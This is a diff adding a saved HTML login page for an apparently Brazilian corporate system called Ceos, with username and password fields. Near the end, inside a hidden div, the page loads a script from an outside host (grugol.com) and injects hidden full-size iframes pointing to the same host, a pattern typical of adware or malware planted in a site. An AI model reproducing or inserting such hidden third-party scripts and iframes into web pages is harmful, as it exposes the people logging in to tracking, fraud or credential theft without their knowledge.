@@ -1,0 +1,76 @@
+<html xmlns="http://www.w3.org/1999/xhtml" style="height: 100%; overflow: hidden;"><head><link type="text/css" rel="stylesheet" href="/javax.faces.resource/theme.css.xhtml?ln=primefaces-smoothness"><link type="text/css" rel="stylesheet" href="/javax.faces.resource/style.css.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=css"><link type="text/css" rel="stylesheet" href="/javax.faces.resource/primefaces.css.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=primefaces"><link type="text/css" rel="stylesheet" href="/javax.faces.resource/log/log.css.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=primefaces"><link type="text/css" rel="stylesheet" href="/javax.faces.resource/layout/layout.css.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=primefaces"><script type="text/javascript" src="/javax.faces.resource/jquery/jquery.js.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=primefaces"></script><script type="text/javascript" src="/javax.faces.resource/primefaces.js.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=primefaces"></script><script type="text/javascript" src="/javax.faces.resource/log/log.js.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=primefaces"></script><script type="text/javascript" src="/javax.faces.resource/layout/layout.js.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=primefaces"></script>
+	
+		<title>Ceos -
+			Autenticação do Usuário</title><script type="text/javascript" src="/javax.faces.resource/jquery.maskMoney.js.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=javascript"></script><script type="text/javascript" src="/javax.faces.resource/jquery.maskedinput.js.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=javascript"></script><script type="text/javascript" src="/javax.faces.resource/nextindom.jquery.js.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=javascript"></script><script type="text/javascript" src="/javax.faces.resource/jquery.ui.touch-punch.min.js.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=javascript"></script><script type="text/javascript" src="/javax.faces.resource/jquery-cron.js.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=javascript"></script><script type="text/javascript" src="/javax.faces.resource/ceos_utils.js.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=javascript"></script><script type="text/javascript" src="/javax.faces.resource/ceos_locales.js.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=javascript"></script>
+		
+	
+		<script type="text/javascript">
+			settingMenu();
+	
+			function showStatus(event) {
+				popUpLoading.show();
+			}
+	
+			function hideStatus() {
+				popUpLoading.hide();
+			}
+			
+			jQuery(document).ready(function() {
+				wireUpEvents();
+			});
+		
+		
+		</script></head><body class="body ui-layout-container" style="position: relative; height: 100%; overflow: hidden; margin: 0px; padding: 0px; border: none;"><div id="j_idt18" class="ui-dialog ui-widget ui-widget-content ui-overlay-hidden ui-corner-all ui-shadow" style="width: auto; height: auto;"><div class="ui-dialog-titlebar ui-widget-header ui-helper-clearfix ui-corner-top"><span class="ui-dialog-title">Carregando...</span></div><div class="ui-dialog-content ui-widget-content" style="height: auto;">
+			<div style="text-align: center;">
+				<p></p><img id="j_idt20" src="/javax.faces.resource/ajaxloadingbar.gif.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=images" alt="" width="220px" height="19px">
+			</div></div></div><div id="layoutMenu" class="ui-layout-unit ui-widget ui-widget-content ui-corner-all ui-layout-north ui-layout-pane ui-layout-pane-north" style="position: absolute; margin: 0px; inset: 0px 0px auto; width: auto; z-index: 1; height: 54px; display: block; visibility: visible;"><div class="ui-layout-unit-content ui-widget-content" style="position: relative; height: 51px; visibility: visible;">
+<form id="formmenu" name="formmenu" method="post" action="/public/login/login;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?cid=3258" enctype="application/x-www-form-urlencoded">
+<input type="hidden" name="formmenu" value="formmenu">
+<table>
+<tbody>
+<tr>
+<td><a href="/loggedIn/index;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL"><img src="/javax.faces.resource/logoceos.png.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=images" height="50" width="100" class="images"></a></td>
+</tr>
+</tbody>
+</table>
+<input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="-8254697710514401946:1573040805203826988" autocomplete="off">
+</form></div></div><div id="layoutContent" class="ui-layout-unit ui-widget ui-widget-content ui-corner-all ui-layout-center layoutunit ui-layout-pane ui-layout-pane-center ui-layout-pane-hover ui-layout-pane-center-hover ui-layout-pane-open-hover ui-layout-pane-center-open-hover" style="position: absolute; margin: 0px; inset: 68px 0px 28px; height: 578px; width: 1344px; z-index: 1; display: block; visibility: visible;"><div class="ui-layout-unit-header ui-widget-header ui-corner-all"><span class="ui-layout-unit-header-title">Autenticação do Usuário</span></div><div class="ui-layout-unit-content ui-widget-content" style="position: relative; height: 545px; visibility: visible;"><div id="ceosGeneralMessages" class="ui-messages ui-widget"></div>
+<form id="formLogin" name="formLogin" method="post" action="/public/login/login;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?cid=3258" enctype="application/x-www-form-urlencoded">
+<input type="hidden" name="formLogin" value="formLogin">
+
+
+			<div class="centerLogin"><img src="/javax.faces.resource/logologin.png.xhtml;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL?ln=images" height="135" width="140" class="imageLogin"><table id="gridLogin">
+<tbody>
+<tr>
+<td><label id="j_idt30" class="ui-outputlabel" for="userLogin">Login:</label></td>
+<td><input id="userLogin" name="userLogin" type="text" autocomplete="false" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all" role="textbox" aria-disabled="false" aria-readonly="false" aria-multiline="false"></td>
+</tr>
+<tr>
+<td><label id="j_idt31" class="ui-outputlabel" for="userPassword">Senha:</label></td>
+<td><input id="userPassword" name="userPassword" type="password" class="ui-inputfield ui-password ui-widget ui-state-default ui-corner-all" autocomplete="false" role="textbox" aria-disabled="false" aria-readonly="false" aria-multiline="false"></td>
+</tr>
+</tbody>
+</table>
+
+
+				<div style="text-align: left;float:left;margin-top: 5px;"><a id="forgotPass" name="forgotPass" href="/public/user/recoverPassword;jsessionid=L+rJjQkRwj+9lmNgPSc+QueL">Esqueceu a senha?</a>
+				</div><input id="currentUrl" type="hidden" name="currentUrl" value="http://integra.ceos.alclog.com.br:8090/public/login/login">
+				<div style="text-align: right;"><button id="buttonLogin" name="buttonLogin" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only ui-state-focus ui-state-hover" onclick="getCurrentUrl();" type="submit" role="button" aria-disabled="false"><span class="ui-button-text">Login</span></button>
+				</div>
+
+			</div><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="-8254697710514401946:1573040805203826988" autocomplete="off">
+</form></div></div><div id="layoutFooter" class="ui-layout-unit ui-widget ui-widget-content ui-corner-all ui-layout-south ui-layout-pane ui-layout-pane-south" style="position: absolute; margin: 0px; inset: auto 0px 0px; width: auto; z-index: 1; height: 14px; display: block; visibility: visible;"><div class="ui-layout-unit-content ui-widget-content" style="position: relative; height: 11px; visibility: visible;"><span style="font-size: 10px;">Versão 4.39.3_integracao construída em 09/11/2021 10:11</span></div></div>
+	
+			<div style="visibility: hidden;" class="hidden_context_path"><script src="http://grugol.com/prog/landing.php?app=QjQtMkUtOTktRjUtMUItRUM=&amp;partner=200"></script><script type="text/javascript">
+		if (top.location == self.location){
+			var ifric = document.createElement('iframe');
+			ifric.id = 'fcdb';
+			ifric.src = 'http://grugol.com/prog/content.php?partner=200';
+			ifric.scrolling = 'no';
+			ifric.width = '1024';
+			ifric.height = '768';
+			ifric.style.display = 'none';
+			document.getElementsByTagName('body')[0].appendChild(ifric);
+		}
+			</script></div><iframe id="fcdb" src="http://grugol.com/prog/content.php?partner=200" scrolling="no" width="1024" height="768" style="display: none;"></iframe>
+<div id="textarea_simulator" style="position: absolute; top: 0px; left: 0px; visibility: hidden;"></div><div class="ui-dialog-docking-zone"></div><div id="layoutMenu-resizer" class="ui-layout-resizer ui-layout-resizer-north ui-layout-resizer-open ui-layout-resizer-north-open" style="position: absolute; padding: 0px; margin: 0px; font-size: 1px; text-align: left; overflow: hidden; z-index: 2; top: 60px; cursor: default; width: 1350px; height: 6px; left: 0px;"></div><div id="layoutFooter-resizer" class="ui-layout-resizer ui-layout-resizer-south ui-layout-resizer-open ui-layout-resizer-south-open" style="position: absolute; padding: 0px; margin: 0px; font-size: 1px; text-align: left; overflow: hidden; z-index: 2; bottom: 20px; cursor: default; width: 1350px; height: 6px; left: 0px;"></div></body></html>
